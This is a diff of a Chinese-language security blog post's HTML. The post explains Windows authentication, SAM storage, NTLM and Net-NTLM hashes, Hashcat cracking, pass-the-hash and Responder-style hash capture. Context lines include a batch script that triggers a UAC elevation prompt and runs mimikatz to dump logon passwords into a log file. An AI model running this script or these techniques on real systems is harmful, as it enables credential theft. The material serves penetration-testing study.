@@ -111,13 +111,15 @@
 <meta property="og:url" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/index.html">
 <meta property="og:site_name" content="M0rk's Blog">
 <meta property="og:description" content="概述 先来了解一下lsass进程。Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies">
+<meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/sam.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/regeditsam.png">
 <meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png">
 <meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png">
-<meta property="og:updated_time" content="2018-01-17T11:42:01.000Z">
+<meta property="og:updated_time" content="2018-12-06T10:49:07.475Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows认证机制以及常见密码获取工具分析">
 <meta name="twitter:description" content="概述 先来了解一下lsass进程。Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies">
-<meta name="twitter:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png">
+<meta name="twitter:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/sam.png">
 
 
 
@@ -398,7 +400,25 @@
         <h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
 <li>先来了解一下lsass进程。<br>Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.<a href="https://www.wikiwand.com/en/Local_Security_Authority_Subsystem_Service" target="_blank" rel="external">link</a></li>
 <li>NTLM</li>
-<li>Kerberos<h4 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h4><a href="http://smartechverse.blogspot.com/2015/06/crack-windows-admin-password-and-sam.html" target="_blank" rel="external">Crack windows Admin Password and Sam Files</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="external">The NTLM Authentication Protocol and Security Support Provider</a><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4></li>
+<li>Kerberos<h4 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h4></li>
+<li>SAM security account manager 账户安全管理。存放位置<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">%SystemRoot%/system32/config/SAM</div><div class="line"> HKEY_LOCAL_MACHINE\SAM</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Windows一旦启动 无法读取，但是可以通过读取内存的方法进行读取。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/sam.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/regeditsam.png" alt=""></p>
+<h4 id="LM-hash、NTLM-hash和NetNTLM"><a href="#LM-hash、NTLM-hash和NetNTLM" class="headerlink" title="LM hash、NTLM hash和NetNTLM"></a>LM hash、NTLM hash和NetNTLM</h4><ul>
+<li><p>在Windows系统中，比较常见是从系统导出来的NTLM hash，通过Hashcat能够破解出明文密码。</p>
+</li>
+<li><p>Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为NetNTLMv1、NetNTLMv1+ESS、NetNTLMv2和NTLM。Hashcat支持的哈希算法：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="external">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+</li>
+<li><p>自Windows Vista和Windows Server 2008开始,Windows取消LM hash,但某些工具的参数需要填写固定格式LM hash:NT hash，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash</p>
+</li>
+<li><p>NTHash (又称作NTLM)，现代操作系统都是用的这种格式密码，我们可以通过dump SAM文件或者使用mimikatz获取到，此外它还存在于域控机器的NTDS文件中。这些哈希值可以用来进行哈希传递攻击。<br>算法是 MD4(UTF-16-LE(password))  NTLM哈希长度为32位。</p>
+</li>
+<li><p>Net-NTMLv1/v2 是指网络环境下NTLM认证中的哈希，也可使用hashcat进行破解。</p>
+</li>
+<li><p>Net-NTLM hash在渗透测试中，通常有以下两种利用方法<br>1.使用中间人攻击的方式来获取Net-NTLM hash，常用工具为Responder和Inveigh<br>2.通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash<br><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="external">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a></p>
+<h4 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h4><p><a href="http://smartechverse.blogspot.com/2015/06/crack-windows-admin-password-and-sam.html" target="_blank" rel="external">Crack windows Admin Password and Sam Files</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="external">The NTLM Authentication Protocol and Security Support Provider</a></p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4></li>
 <li>内存导出<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li>
 <li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""></li>
 <li>自动获取内存密码bat脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">&gt;nul 2&gt;&amp;1 &quot;%SYSTEMROOT%\system32\cacls.exe&quot; &quot;%SYSTEMROOT%\system32\config\system&quot;</div><div class="line">if &apos;%errorlevel%&apos; NEQ &apos;0&apos; (</div><div class="line">goto UACPrompt</div><div class="line">) else ( goto gotAdmin )</div><div class="line">:UACPrompt</div><div class="line">echo Set UAC = CreateObject^(&quot;Shell.Application&quot;^) &gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">echo UAC.ShellExecute &quot;%~s0&quot;, &quot;&quot;, &quot;&quot;, &quot;runas&quot;, 1 &gt;&gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">&quot;%temp%\getadmin.vbs&quot;</div><div class="line">exit /B</div><div class="line">:gotAdmin</div><div class="line">if exist &quot;%temp%\getadmin.vbs&quot; ( del &quot;%temp%\getadmin.vbs&quot; )</div><div class="line">pushd &quot;%CD%&quot;</div><div class="line">CD /D &quot;%~dp0&quot;</div><div class="line"></div><div class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</div></pre></td></tr></table></figure>
@@ -663,7 +683,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Crack"><span class="nav-number">2.</span> <span class="nav-text">Crack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">3.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SAM"><span class="nav-number">2.</span> <span class="nav-text">SAM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LM-hash、NTLM-hash和NetNTLM"><span class="nav-number">3.</span> <span class="nav-text">LM hash、NTLM hash和NetNTLM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Crack"><span class="nav-number">4.</span> <span class="nav-text">Crack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">5.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
